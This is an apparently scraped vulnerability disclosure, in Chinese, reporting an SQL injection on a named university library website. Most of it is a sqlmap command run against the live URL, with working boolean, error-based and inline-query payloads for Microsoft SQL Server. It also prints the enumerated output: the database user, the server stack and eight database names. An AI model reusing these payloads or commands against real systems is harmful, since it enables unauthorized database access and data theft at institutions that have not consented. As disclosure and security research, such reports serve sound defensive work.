wybug_title: 南京理工大学图书馆英文版本站点SQL注入
wybug_status: 已交由第三方合作机构(CCERT教育网应急响应组)处理
wybug_detail: 漏洞详情 披露状态：   									2015-06-02：	细节已通知厂商并且等待厂商处理中									2015-06-07：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 六朝古都南京 详细说明：  注入点：http://lib.njust.edu.cn/english/content.asp?id=2sqlmap -u "http://lib.njust.edu.cn/english/content.asp?id=2" --dbs --current-user    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. WHERE or HAVING clause    Payload: id=2 AND 6195=6195    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: id=2 AND 3705=CONVERT(INT,(SELECT CHAR(113)+CHAR(112)+CHAR(98)+CHAR(100)+CHAR(113)+(SELECT (CASE WHEN (3705=3705) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(108)+CHAR(105)+CHAR(113)))    Type: inline query    Title: Microsoft SQL Server/Sybase inline queries    Payload: id=(SELECT CHAR(113)+CHAR(112)+CHAR(98)+CHAR(100)+CHAR(113)+(SELECT (CASE WHEN (4188=4188) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(108)+CHAR(105)+CHAR(113))---[12:15:55] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000[12:15:55] [INFO] fetching current user[12:15:55] [INFO] retrieved: njustlibcurrent user:    'njustlib'[12:15:55] [INFO] fetching database names[12:15:56] [INFO] the SQL query used returns 8 entries[12:15:56] [INFO] resumed: DataBase[12:15:56] [INFO] resumed: master[12:15:56] [INFO] resumed: model[12:15:56] [INFO] resumed: msdb[12:15:56] [INFO] resumed: new_njust_lib[12:15:56] [INFO] resumed: Northwind[12:15:56] [INFO] resumed: pubs[12:15:56] [INFO] resumed: tempdbavailable databases [8]:[*] DataBase[*] master[*] model[*] msdb[*] new_njust_lib[*] Northwind[*] pubs[*] tempdb[12:15:56] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) -
